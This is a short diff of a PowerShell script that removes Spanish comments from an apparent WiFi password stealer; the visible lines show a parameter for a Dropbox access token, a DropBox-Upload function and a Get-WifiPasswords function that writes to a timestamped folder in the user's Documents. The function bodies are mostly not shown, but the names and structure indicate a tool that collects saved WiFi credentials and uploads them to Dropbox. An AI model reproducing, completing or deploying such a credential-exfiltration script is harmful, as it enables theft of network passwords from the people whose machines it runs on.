@@ -1,9 +1,7 @@
-# Define el parámetro para el token de acceso de Dropbox
 param (
     [string]$db
 )
 
-# Función para subir archivos a Dropbox
 function DropBox-Upload {
     [CmdletBinding()]
     param (
@@ -45,7 +43,6 @@ function DropBox-Upload {
     Remove-Item -Path $tempFilePath -Force
 }
 
-# Función para obtener las contraseñas WiFi
 function Get-WifiPasswords {
     $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
     $userDir = "$env:USERPROFILE\Documents\Networks_$folderDateTime"
